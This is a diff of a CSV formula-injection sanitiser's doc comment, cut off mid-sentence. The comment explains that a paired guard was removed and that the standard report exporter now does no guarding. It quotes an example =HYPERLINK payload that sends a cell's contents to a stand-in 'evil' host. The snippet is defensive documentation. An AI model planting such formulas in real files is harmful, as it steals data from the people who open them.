@@ -16,8 +16,13 @@ const UTF8_BOM = '\uFEFF';
 const FORMULA_TRIGGERS = ['=', '+', '-', '@', '\t', '\r'];
 
 /**
- * Quote a value for CSV and neutralise formula injection \u2014 the mirror of
- * EventExportController.csvCell, for CSVs assembled client-side.
+ * Quote a value for CSV and neutralise formula injection.
+ *
+ * This used to be one of a matched pair, mirroring EventExportController.csvCell.
+ * That class went when the approved-invitee export became a standard report, and
+ * the standard report exporter does no such guarding — so this is now the only
+ * sanitised download in the project, covering the import wizard's manual-review
+ * list. Fewer places to keep in step, but also less covered ground.
  *
  * A cell opening with =, +, - or @ is executed when the file is opened, so
  * `=HYPERLINK("http://evil/?d="&A1,"Invoice")` in an imported contact name
